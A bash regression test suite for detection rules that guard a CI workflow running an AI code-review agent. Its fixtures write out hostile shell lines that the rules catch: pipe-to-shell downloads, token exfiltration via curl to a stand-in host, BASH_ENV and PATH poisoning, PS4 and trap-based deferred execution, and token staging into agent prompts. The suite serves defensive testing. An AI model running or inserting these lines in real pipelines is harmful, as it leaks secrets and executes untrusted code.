#!/usr/bin/env bash
# Regression suite for the reviewer-hardening rules: quoted YAML keys,
# every-runner-consumer, deferred execution, indirect invocation,
# data-program (perl/jq) content, trusted signals, and base execution.
# Harness lives in semgrep-sarif-test-lib.sh (sourced).
#
# Usage: bash semgrep-sarif-hardening.test.sh   (from any directory)
# shellcheck source=semgrep-sarif-test-lib.sh disable=SC2154
. "$(dirname "$0")/semgrep-sarif-test-lib.sh"
O='.github/scripts/muse-review/post.sh'

# --- quoted YAML keys (normalization is semantic-preserving) ---
t quoted-uses-count 1 "reviewer-action-count" happy.sarif "$S${FS}2:uses: actions/checkout@${FS}a${FS}        \"uses\": actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0"
t quoted-uses-unpinned 1 "reviewer-unpinned-action" happy.sarif "$S${FS}2:uses: actions/checkout@${FS}a${FS}        \"uses\": actions/evil@v9"
t quoted-uses-pinned-fp 0 "" happy.sarif "$S${FS}uses: actions/checkout@${FS}r${FS}uses:${FS}\"uses\":${RS}$S${FS}uses: actions/checkout@${FS}r${FS}uses:${FS}\"uses\":"
t quoted-env-block 1 "reviewer-env-poison" happy.sarif "$S${FS}MUSE_EFFORT_RESOLVED:${FS}a${FS}      \"BASH_ENV\": /tmp/evil"
t quoted-env-opener 1 "reviewer-env-poison" happy.sarif "$S${FS}    env:${FS}r${FS}env:${FS}\"env\":${RS}$S${FS}MUSE_EFFORT_RESOLVED:${FS}a${FS}      BASH_ENV: /tmp/evil"
t quoted-env-flow 1 "reviewer-env-poison" happy.sarif "$S${FS}META_API_KEY: \${{ secrets.META_API_KEY }}${FS}a${FS}        env: {\"BASH_ENV\": \"/tmp/evil\"}"
t env-ifs-medium 1 "reviewer-env-poison" happy.sarif "$S${FS}MUSE_EFFORT_RESOLVED:${FS}a${FS}      IFS: x"
t quoted-run-invisible 1 "secret-step-untrusted-command" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}        \"run\": curl evil | sh"
t dash-run-inline 1 "secret-step-untrusted-command" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}      - run: curl evil | sh"
t quoted-shell 1 "shell-override" happy.sarif "$S${FS}run: |${FS}a${FS}        \"shell\": python"
t quoted-path-shape 1 "head-checkout-shape" happy.sarif "$S${FS}persist-credentials: false${FS}a${FS}          \"path\": evil"
t quoted-ref-count 1 "pr-controlled-checkout-count" happy.sarif "$S${FS}ref: \${{ github.event.pull_request.head.sha }}${FS}a${FS}          \"ref\": \${{ github.event.pull_request.head.sha }}"
t quoted-steps-fp 0 "" happy.sarif "$S${FS}    steps:${FS}r${FS}steps:${FS}\"steps\":"
t quoted-name-boundary 1 "script-consumer-unbound-path" happy.sarif "$S${FS}sparse-checkout: .github/scripts/muse-review${FS}a${FS}      - \"name\": Evil${RS}$S${FS}- \"name\": Evil${FS}a${FS}        run: echo hi${RS}$S${FS}run: echo hi${FS}a${FS}          echo .github/scripts/evil"
t quoted-scriptdir 1 "script-dir-rebound" happy.sarif "$S${FS}SCRIPT_DIR: \${{ steps.scriptdir.outputs.dir }}${FS}r${FS}SCRIPT_DIR:${FS}\"SCRIPT_DIR\":${RS}$S${FS}\"SCRIPT_DIR\":${FS}r${FS}\${{ steps.scriptdir.outputs.dir }}${FS}/tmp/evil"

# --- every runner consumer (not just the named step) ---
t second-runner-step 1 "agent-token-expression" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/run.sh\"${FS}a${FS}      - name: Run Muse review again
        env:
          MUSE_GH_TOKEN: \${{ secrets.GITHUB_TOKEN }}
          SCRIPT_DIR: \${{ steps.scriptdir.outputs.dir }}
        run: |
          set -euo pipefail
          bash \"\${SCRIPT_DIR}/run.sh\""

# --- deferred execution (proven: single quotes evaluate later) ---
t ps4-setx 1 "run-body-deferred-exec" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          PS4='\$(bash \"\${GITHUB_WORKSPACE}/evil.sh\")'${RS}$S${FS}PS4='\$(bash${FS}a${FS}          set -x"
t ps4-binding-alone 1 "run-body-deferred-exec" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          PS4='\$(id)'"
t prompt-command 1 "run-body-deferred-exec" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          PROMPT_COMMAND='evil'"
t printf-v-ps4 1 "run-body-deferred-exec" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          printf -v PS4 'x'"
t set-x-alone 1 "run-body-xtrace" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          set -x"
t arith-sq-sub 1 "run-body-arithmetic-sub" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          x=\$(( '\$(id)' + 1 ))"
t arith-cmdsub 1 "run-body-arithmetic-sub" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          x=\$(( \$(id) + 1 ))"
t arith-plain-fp 0 "" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          x=\$(( total - 1 ))"
t helper-ps4 1 "helper-deferred-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}PS4='\$(id)'"
t helper-xtrace 1 "helper-xtrace" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}set -x"
t helper-arith 1 "helper-arithmetic-sub" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}x=\$(( \$(id) ))"
t helper-path-bare 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}PATH=/evil"
t helper-ifs-bare 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}IFS=x"
t helper-ifs-read-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}IFS=\$'\\t' read -r a b < /dev/null"

# --- indirect agent invocation (resolve or prohibit) ---
t muse-bin 1 "agent-invocation-count" happy.sarif "$R${FS}muse_rc=\$?${FS}a${FS}MUSE_BIN=\"\${HOME}/.local/bin/\"muse${RS}$R${FS}MUSE_BIN=\"\${HOME}${FS}a${FS}\"\${MUSE_BIN}\" exec --prompt-file x"
t muse-unresolved 1 "agent-indirect-unresolved" happy.sarif "$R${FS}muse_rc=\$?${FS}a${FS}\"\${MUSE_BIN}\" exec --prompt-file x"

# --- data-program content (perl/jq run with tokens) ---
t pl-begin 1 "helper-perl-danger" happy.sarif "$P${FS}print \"[\"${FS}b${FS}BEGIN { system(\"id\") }"
t pl-system 1 "helper-perl-danger" happy.sarif "$P${FS}print \"[\"${FS}b${FS}  system(\"id\");"
t pl-backtick 1 "helper-perl-danger" happy.sarif "$P${FS}print \"[\"${FS}b${FS}  \$x = \`id\`;"
t pl-open-pipe 1 "helper-perl-danger" happy.sarif "$P${FS}print \"[\"${FS}b${FS}  open(my \$p, \"-|\", \"id\");"
t pl-open-write 1 "helper-perl-danger" happy.sarif "$P${FS}print \"[\"${FS}b${FS}  open(my \$o, \">\", \$x);"
t pl-ee 1 "helper-perl-danger" happy.sarif "$P${FS}print \"[\"${FS}b${FS}  \$x =~ s/a/\$b/gee;"
t pl-require 1 "helper-perl-danger" happy.sarif "$P${FS}print \"[\"${FS}b${FS}require Foo;"
t pl-dofile 1 "helper-perl-danger" happy.sarif "$P${FS}print \"[\"${FS}b${FS}do \"x.pl\";"
t pl-uselib 1 "helper-perl-danger" happy.sarif "$P${FS}print \"[\"${FS}b${FS}use lib \"/tmp\";"
t pl-reqver-fp 0 "" happy.sarif "$P${FS}print \"[\"${FS}b${FS}require 5.008;"
t jq-env 1 "helper-jq-env" happy.sarif "$C${FS}| .next_steps${FS}r${FS}| .next_steps${FS}| env | .next_steps"
t jq-ENV-var 1 "helper-jq-env" happy.sarif "$C${FS}| .next_steps${FS}r${FS}| .next_steps${FS}| \$ENV.HOME | .next_steps"
t jq-field-fp 0 "" happy.sarif "$O${FS}jq -r '.verdict${FS}r${FS}.verdict${FS}.env"
t jq-inline-env 1 "helper-jq-env" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}x=\"\$(jq -n 'env.HOME')\""
t gh-jq-env 1 "helper-jq-env" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api x --jq 'env.HOME'"
t jq-minus-L 1 "helper-jq-env" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}jq -L /tmp . f"
t unknown-format 1 "helper-unknown-format" happy.sarif "new:.github/scripts/muse-review/evil.py${FS}print(1)"
t referenced-missing 1 "helper-referenced-missing" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          bash \"\${SCRIPT_DIR}/nonexistent.sh\""

# --- trusted-set change signal through the no-checkout exit ---
t no-checkout-trusted 1 "trusted tree changed" happy.sarif "rm:$S" "" "true"
t ref-removed-trusted 1 "trusted tree changed" happy.sarif "$S${FS}ref: \${{ github.event.pull_request.head.sha }}${FS}d" "" "true"
t corrupt-sarif 1 "SARIF parse failed" corrupt.sarif "none"

# --- scope-glob lockstep (every trusted path must trigger the job) ---
SEC="$ROOT/.github/workflows/security.yml"
stanza_has() {
  if sed -n "/^ *$1:\$/,/$2/p" "$SEC" | grep -qF "$3"; then echo yes; else echo no; fi
}
assert_eq "relevant-hyphen" "yes" "$(stanza_has semgrep_relevant trusted_changed '.github/scripts/semgrep-sarif*')"
assert_eq "relevant-underscore" "yes" "$(stanza_has semgrep_relevant trusted_changed '.github/scripts/semgrep_sarif_*')"
assert_eq "trusted-hyphen" "yes" "$(stanza_has trusted_changed 'Resolve Semgrep scope' '.github/scripts/semgrep-sarif*')"
assert_eq "trusted-underscore" "yes" "$(stanza_has trusted_changed 'Resolve Semgrep scope' '.github/scripts/semgrep_sarif_*')"

# --- base-revision filter execution (head replacement is ignored) ---
# Mirrors the security.yml base-filter steps against scratch repos: base
# holds a working auditor copy, head holds an exit-0 stub. The pipeline
# must run the BASE copy (exit 1 on the planted marker), proving the
# head stub never executes. git is required (selftest checks out repos).
command -v git >/dev/null 2>&1 || { echo "FAIL base-exec-missing-git"; fail=$(( fail + 1 )); }
if command -v git >/dev/null 2>&1; then
  ORIGIN="$WORK/origin.git"
  rm -rf "$ORIGIN" "$WORK/seed" "$WORK/ws" "$WORK/bf"
  git init --bare -q "$ORIGIN" 2>/dev/null
  git init -q "$WORK/seed" 2>/dev/null && git -C "$WORK/seed" checkout -q -b main 2>/dev/null
  mkdir -p "$WORK/seed/.github/scripts" "$WORK/seed/.github/workflows"
  printf '#!/usr/bin/env python3\nimport sys\nsys.exit(1 if "MARKER" in open(".github/workflows/x.yml").read() else 0)\n' > "$WORK/seed/.github/scripts/f.py"
  printf 'clean\n' > "$WORK/seed/.github/workflows/x.yml"
  git -C "$WORK/seed" -c user.email=t@t -c user.name=t add -A 2>/dev/null
  git -C "$WORK/seed" -c user.email=t@t -c user.name=t commit -qm base 2>/dev/null
  git -C "$WORK/seed" checkout -q -b head 2>/dev/null
  printf '#!/usr/bin/env python3\n' > "$WORK/seed/.github/scripts/f.py"
  git -C "$WORK/seed" -c user.email=t@t -c user.name=t commit -qam stub 2>/dev/null
  git -C "$WORK/seed" push -q "$ORIGIN" main head 2>/dev/null
  git clone -q --depth 1 --branch head "file://$ORIGIN" "$WORK/ws" 2>/dev/null
  git clone -q --depth 1 --branch main "file://$ORIGIN" "$WORK/bf" 2>/dev/null
  git -C "$WORK/bf" sparse-checkout set .github/scripts 2>/dev/null
  printf 'MARKER\n' >> "$WORK/ws/.github/workflows/x.yml"
  (cd "$WORK/ws" && python3 "$WORK/bf/.github/scripts/f.py" 2>/dev/null); got="$?"
  assert_eq "base-exec-runs-base-code" "1" "$got"
  (cd "$WORK/ws" && python3 .github/scripts/f.py 2>/dev/null); got="$?"
  assert_eq "base-exec-control-stub-passes" "0" "$got"
fi

# --- base-checkout lockstep (the YAML the mechanism mirrors) ---
for lock in "path: base-filter" \
    "base filter copy missing" "sparse-checkout: .github/scripts"; do
  if grep -qF "$lock" "$SEC"; then got="yes"; else got="no"; fi
  assert_eq "lockstep:$lock" "yes" "$got"
done
if sed -n '/Checkout base filter/,/Drop audited/p' "$SEC" \
    | grep -qF "pull_request.base.ref"; then got="yes"; else got="no"; fi
assert_eq "lockstep:base-ref-checkout" "yes" "$got"

# --- base-filter existence lockstep (every auditor module gated) ---
# A base tree missing any imported module ImportErrors instead of
# failing with the clean gate message; derive the module list
# from the tree so the next new module cannot repeat the omission.
loop="$(grep "for f in semgrep-sarif-filter.py" "$SEC")"
missing=""
for mod in "$ROOT"/.github/scripts/semgrep_sarif_*.py; do
  name="$(basename "$mod")"
  case "$loop" in *"$name"*) ;; *) missing="$missing $name";; esac
done
assert_eq "lockstep:existence-complete" "" "$missing"

# --- workspace anchoring (reads GITHUB_WORKSPACE, not CWD) ---
# CWD holds the pristine tree while GITHUB_WORKSPACE points at a
# drifted copy: the filter must report the drifted tree's drift
# (exit 1 + label), not the pristine CWD's clean pass (exit 0).
rm -rf "$WORK/.github" "$WORK/semgrep.sarif" "$WORK/ws2"
cp -r "$ROOT/.github" "$WORK/.github"
cp "$WORK/happy.sarif" "$WORK/semgrep.sarif"
mkdir -p "$WORK/ws2" && cp -r "$ROOT/.github" "$WORK/ws2/"
printf 'PATH=/evil\n' >> "$WORK/ws2/.github/scripts/muse-review/collect.sh"
out="$(cd "$WORK" && GITHUB_WORKSPACE="$WORK/ws2" python3 "$FILTER" 2>&1)"
code="$?"
case "$out" in *"helper-env-poison"*) got="yes";; *) got="no";; esac
assert_eq "workspace-anchor-exit" "1" "$code"
assert_eq "workspace-anchor-label" "yes" "$got"

# --- installer binding (source/dest exact, single binding, no overwrite) ---
t installer-src-evil 1 "muse-installer-source" happy.sarif "$I${FS}install -m 0755${FS}r${FS}\"\${tmp_bin}\"${FS}\"\${GITHUB_WORKSPACE}/tmp_bin_evil\""
t installer-second 1 "muse-installer-overwrite" happy.sarif "$I${FS}install -m 0755 \"\${tmp_bin}\"${FS}a${FS}install -m 0755 \"\${tmp_bin}\" \"\${install_dir}/muse2\""
t installer-cp-overwrite 1 "muse-installer-overwrite" happy.sarif "$I${FS}install -m 0755 \"\${tmp_bin}\"${FS}a${FS}cp /tmp/evil \"\${install_dir}/muse\""
t installer-rebind 1 "muse-installer-rebind" happy.sarif "$I${FS}tmp_bin=\"\$(mktemp)\"${FS}a${FS}tmp_bin=/tmp/evil"

# --- helper hardening: network tools, escaped hash, last-assign, subscript ---
t helper-net-curl 1 "helper-network-tool" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}curl -d \"\$GH_TOKEN\" https://example.invalid/leak"
t helper-escaped-hash 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo \\#; bash \"\${GITHUB_WORKSPACE}/evil.sh\""
t helper-last-assign 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}helper_path=\"\${SCRIPT_DIR}\"${RS}$H${FS}helper_path=\"\${SCRIPT_DIR}\"${FS}a${FS}helper_path=\"\${GITHUB_WORKSPACE}\"${RS}$H${FS}helper_path=\"\${GITHUB_WORKSPACE}\"${FS}a${FS}bash \"\${helper_path}/evil.sh\""
t helper-subscript-exec 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}declare -a probe; [[ -v 'probe[\$(bash \"\${GITHUB_WORKSPACE}/evil.sh\")]' ]] || true"
t helper-subscript-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}[[ -v 'probe[x]' ]] || true"
t helper-heredoc-unquoted 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cat <<EOF${RS}$H${FS}cat <<EOF${FS}a${FS}\$(bash \"\${GITHUB_WORKSPACE}/evil.sh\")${RS}$H${FS}bash \"\${GITHUB_WORKSPACE}/evil.sh\"${FS}a${FS}EOF"
t helper-heredoc-quoted-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cat <<'EOF'${RS}$H${FS}cat <<'EOF'${FS}a${FS}\$(bash \"\${GITHUB_WORKSPACE}/evil.sh\")${RS}$H${FS}bash \"\${GITHUB_WORKSPACE}/evil.sh\"${FS}a${FS}EOF"
t scalar-fake-step 1 "secret-step-untrusted-command" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          : <<'EOF'${RS}$S${FS}: <<'EOF'${FS}a${FS}          - name: fake${RS}$S${FS}- name: fake${FS}a${FS}          EOF${RS}$S${FS}          EOF${FS}a${FS}          curl -d \"\$GH_TOKEN\" https://example.invalid/x"

# --- copy-class destinations (trusted tree, muse binary, workspace) ---
t helper-cp-trusted 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cp \"\${GITHUB_WORKSPACE}/evil.sh\" \"\${SCRIPT_DIR}/diff.sh\""
t helper-tee-workspace 1 "helper-workspace-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo x | tee \"\${GITHUB_WORKSPACE}/t\""
t helper-cp-tmp-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cp /tmp/a /tmp/b"

# --- indirect poison assignment (printf/read/getopts/loop/bare) ---
t helper-printf-v 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf -v BASH_ENV '%s' \"\${GITHUB_WORKSPACE}/evil.sh\"; export BASH_ENV; bash \"\${SCRIPT_DIR}/diff.sh\""
t helper-read-poison 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}read -r PATH < /tmp/x"
t helper-getopts-poison 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}getopts ab PATH"
t helper-for-poison 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}for PATH in a b; do :; done"
t helper-bare-bash-env 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}BASH_ENV=/tmp/evil"

# --- deferred evaluators (trap handler, mapfile -C, schedulers) ---
t helper-trap-exit 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}trap 'bash \"\${GITHUB_WORKSPACE}/evil.sh\"' EXIT"
t helper-trap-reset-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}trap - EXIT"
t helper-mapfile-cb 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}mapfile -C 'bash \"\${GITHUB_WORKSPACE}/evil.sh\"' -c 1 < /tmp/x"
t helper-at-deny 1 "helper-deferred-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}at now < /tmp/job"

# --- perl opens (paren-free, sysopen) ---
t helper-perl-openfree 1 "helper-perl-danger" happy.sarif "$P${FS}open(my \$fh${FS}a${FS}open my \$fh2, \"|-\", \"bash\", \"\$ENV{GITHUB_WORKSPACE}/evil.sh\"; close \$fh2;"
t helper-perl-sysopen 1 "helper-perl-danger" happy.sarif "$P${FS}open(my \$fh${FS}a${FS}sysopen(FH2, \$f, O_RDWR);"

# --- workspace writes (token staging) ---
t helper-ws-redirect 1 "helper-workspace-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf '%s' \"\${GH_TOKEN}\" > \"\${GITHUB_WORKSPACE}/review-token\""

# --- agent argv (value-boundary, scrub exactness, model shape) ---
t runner-model-glue 1 "agent-shell-boundary" happy.sarif "$R${FS}  --disable-shell \\${FS}r${FS}--disable-shell${FS}--model \"--disable-shell --disable-write\""
t runner-scrub-glue 1 "agent-token-isolation" happy.sarif "$R${FS}env -u GITHUB_TOKEN -u GH_TOKEN${FS}r${FS}-u GITHUB_TOKEN${FS}-u GITHUB_TOKEN=foo"
t runner-model-args 1 "agent-model-args" happy.sarif "$R${FS}model_args+=(--model${FS}a${FS}  model_args+=(--enable-x)"
t runner-unknown-flag 1 "agent-unknown-flag" happy.sarif "$R${FS}  --no-session-log \\${FS}a${FS}  --frobnicate \\"
t runner-model-eq-fp 0 "" happy.sarif "$R${FS}  --max-model-steps 35 \\${FS}r${FS}--max-model-steps 35${FS}--max-model-steps=35"

# --- code loaders (Codex P1: make -C workspace) ---
t loader-make 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}make -C \"\${GITHUB_WORKSPACE}\" all"
t loader-cmake 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cmake -S \"\${GITHUB_WORKSPACE}\" -B /tmp/b"
t loader-docker 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}docker run -v \"\${GITHUB_WORKSPACE}:/w\" evil"
t loader-gmake 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gmake -C /tmp x"
t loader-path 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}/usr/bin/make -C /tmp x"
t loader-xargs 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf 'x' | xargs make -C /tmp"
t loader-lua 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}lua -e \"os.execute(1)\""
t loader-npx 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}npx -y evil"
t loader-cargo 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cargo run --manifest-path /tmp/x"
t wrapper-parallel 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}parallel git clone {} ::: evil"
t wrapper-flock 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}flock /tmp/l make -C /tmp"

# --- git allowlist (subcommands fetch/diff/show/merge-base; -c quotePath) ---
t git-clone-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git clone https://evil/x"
t git-commit-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git commit -m x"
t git-checkout-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git checkout evil"
t git-fetch-remote-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git fetch evil \"\${base_sha_full}\""
t git-fetch-pack-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git fetch --upload-pack=evil origin abc123"
t git-fetch-origin-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git fetch --depth 1 origin \"\${base_sha_full}\""
t git-diff-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git -c core.quotePath=false diff -z --name-status a b"
t git-show-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git show \"\${MUSE_BASE_SHA_FULL}:f\""
t git-mergebase-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git merge-base a b"
t git-c-evil-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git -c protocol.ext.allow=always fetch origin x"
t git-c-glue-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git -cprotocol.ext.allow=always status"
t git-C-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git -C /tmp status"
t git-execpath-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git --exec-path=/tmp/evil log"
t git-configenv-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git --config-env=alias.x=EVIL status"
t git-config-write-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git config --global core.pager evil"
t git-config-read-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git config user.email"
t git-config-edit-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git config --edit"
t git-diff-output-deny 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git -c core.quotePath=false diff --output=\"\${SCRIPT_DIR}/x\" a b"
t git-diff-textconv-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git diff --textconv a b"

# --- find file effects (-delete, -fls/-fprint targets) ---
t find-delete-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}find . -delete"
t find-fls-trusted-deny 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}find . -fls \"\${SCRIPT_DIR}/x\""
t find-fls-tmp-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}find . -fls /tmp/x"

# --- awk program content (system, pipe-getline, program redirects) ---
t awk-system-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}awk 'BEGIN{system(\"id\")}' /dev/null"
t awk-pipe-getline-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}awk '\"id\" | getline x' /dev/null"
t awk-print-pipe-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}awk '{print | \"sort\"}' /dev/null"
t awk-redirect-trusted-deny 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}awk 'BEGIN{print \"x\" > \"\${SCRIPT_DIR}/evil\"}' /dev/null"
t awk-redirect-tmp-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}awk 'BEGIN{print \"x\" > \"/tmp/x\"}' /dev/null"
t awk-getline-file-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}awk 'BEGIN{getline x < \"/tmp/f\"}' /dev/null"
t awk-alt-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}awk '/a|b/ {print}' /dev/null"
t awk-string-pipe-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}awk '{print \"a|b\"}' /dev/null"

# --- installer TOCTOU (Codex P1: post-verify tmp_bin write) ---
t toctou-cat 1 "muse-installer-toctou" happy.sarif "$I${FS}got_sha=${FS}a${FS}cat \"\${GITHUB_WORKSPACE}/evil\" > \"\${tmp_bin}\""
t toctou-cp 1 "muse-installer-toctou" happy.sarif "$I${FS}got_sha=${FS}a${FS}cp /tmp/evil \"\${tmp_bin}\""
t toctou-tee 1 "muse-installer-toctou" happy.sarif "$I${FS}got_sha=${FS}a${FS}printf evil | tee \"\${tmp_bin}\" >/dev/null"
t toctou-curl 1 "muse-installer-toctou" happy.sarif "$I${FS}got_sha=${FS}a${FS}curl -fsSL -o \"\${tmp_bin}\" https://evil/x"
t toctou-preverify-fp 0 "" happy.sarif "$I${FS}got_sha=${FS}b${FS}cp /tmp/stage \"\${tmp_bin}\""
t toctou-reread-fp 0 "" happy.sarif "$I${FS}got_sha=${FS}a${FS}sha256sum \"\${tmp_bin}\" | awk '{print \$1}'"
t toctou-noverify 1 "muse-installer-no-verify" happy.sarif "$I${FS}got_sha=\"\$(sha256sum${FS}d"

# --- secret staging (Codex P1: token into agent inputs; env dumps) ---
PR='.github/scripts/muse-review/prompt.sh'
t stage-token 1 "helper-secret-expand" happy.sarif "$PR${FS}} > \"\${prompt_file}\"${FS}a${FS}echo \"\${GH_TOKEN}\" >> \"\${prompt_file}\""
t stage-token-group 1 "helper-secret-expand" happy.sarif "$PR${FS}} > \"\${prompt_file}\"${FS}b${FS}  echo \"token: \${GH_TOKEN}\""
t stage-bareword-fp 0 "" happy.sarif "$PR${FS}} > \"\${prompt_file}\"${FS}a${FS}echo GH_TOKEN >> \"\${prompt_file}\""
t stage-substr 1 "helper-secret-expand" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo \"\${GITHUB_TOKEN:0:4}\" >> /tmp/x"
t stage-suffix-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo \"\${GH_TOKEN_SUFFIX:-none}\""
t stage-printenv 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printenv GH_TOKEN"
t stage-envdump 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}env > /tmp/x"
t stage-envscrub-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}env -u GITHUB_TOKEN -u GH_TOKEN \"/bin/echo\" hi > /tmp/x"
t stage-export-bare 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}export"
t stage-declare-p 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}declare -p GH_TOKEN"
t stage-set-bare 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}set"
t stage-export-value-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}export FOO=bar"
t stage-poison-git-ssh 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}export GIT_SSH_COMMAND=/tmp/evil"
t stage-poison-pager 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}PAGER=/tmp/evil"
t stage-poison-git-count 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}GIT_CONFIG_COUNT=1"
t stage-poison-git-dir 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}GIT_DIR=/tmp/evil"

